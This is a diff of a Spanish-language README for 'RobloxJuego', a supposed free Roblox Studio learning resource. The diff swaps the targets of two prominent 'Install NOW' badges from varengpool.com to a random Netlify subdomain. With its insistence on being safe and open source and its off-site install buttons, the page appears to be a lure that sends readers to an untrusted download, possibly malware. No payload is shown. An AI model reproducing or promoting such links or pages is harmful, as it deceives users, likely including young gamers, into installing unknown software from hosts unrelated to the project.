@@ -6,7 +6,7 @@
 ![Visitantes: 18K+](https://img.shields.io/badge/Visitantes-18K+-ff9f43) ![Actualizado: Septiembre 2025](https://img.shields.io/badge/Actualizado-Septiembre_2025-3498db)  
 
 
-[![Install NOW](https://img.shields.io/badge/Install-NOW-purple?style=for-the-badge&logo=roblox&logoColor=white)](https://varengpool.com)
+[![Install NOW](https://img.shields.io/badge/Install-NOW-purple?style=for-the-badge&logo=roblox&logoColor=white)](https://rainbow-biscotti-69b153.netlify.app/)
 -
 **🌈 ¡Construye Mundos Únicos!**  
 **RobloxJuego** es un recurso educativo gratuito de 2025 para aprender a diseñar mundos en Roblox Studio (1.22+). 🎲 Creado para proyectos de un solo jugador, es seguro, de código abierto y cumple con los Términos de Servicio de GitHub y Roblox. ¡Únete a 18K+ soñadores para liberar tu imaginación! 🚀  
@@ -48,7 +48,7 @@ RobloxJuego es exclusivamente para uso local en Roblox Studio (modo de un solo j
 **Segundo ejemplo visual que demuestra el funcionamiento del proyecto** 🌟  
 ![Vista Previa 2](https://i.imgur.com/UtyXO2m.png)  
 
-[![Install NOW](https://img.shields.io/badge/Install-NOW-purple?style=for-the-badge&logo=roblox&logoColor=white)](https://varengpool.com)
+[![Install NOW](https://img.shields.io/badge/Install-NOW-purple?style=for-the-badge&logo=roblox&logoColor=white)](https://rainbow-biscotti-69b153.netlify.app/)
 -
 
 **🤗 Cómo Colaborar**  
